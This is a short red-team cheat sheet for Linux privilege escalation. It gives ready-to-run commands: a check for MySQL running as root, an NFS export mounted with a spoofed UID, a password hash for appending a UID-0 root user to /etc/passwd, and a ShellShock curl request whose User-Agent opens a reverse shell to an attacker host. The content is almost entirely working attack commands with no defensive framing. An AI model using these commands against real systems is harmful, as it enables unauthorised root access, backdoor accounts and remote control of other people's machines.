### [MySQL User Defined Functions](https://redteamnation.com/mysql-user-defined-functions/)

check if user = root

```shell
cat /etc/mysql/mariadb.conf.d/50-server.cnf | grep user
```

NFS mount privilege

```shell
showmount -e <target ip>
# Export list for <target ip>:
# /home/tester    *
mkdir /tmp/tester
sudo mount -t nfs <target ip>:/home/tester /tmp/tester
find /tmp/tester -ls
# file permission, match uid
# drwxr-xr-x   2 1003     1003         1234 Feb 15 13:59 /tmp/Documents
sudo useradd tester01
sudo usermod -u 1003 tester01
sudo su tester01 -c bash
ls -la /tmp/tester
```

/etc/passwd

```shell
# generating password
openssl passwd -1 -salt 1234 <password>
# openssl passwd -1 -salt 1234 test1234
# $1$1234$LedaKjyvU08i2tNM5HGSg.
# create new user
# echo "test01:\$1\$1234\$LedaKjyvU08i2tNM5HGSg.:0:0:root:/root:/bin/bash" >> /etc/passwd
# su test01
```

ShellShock

```shell
curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1; echo zzzz;'" http://<target ip>/cgi-bin/home.cgi | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
```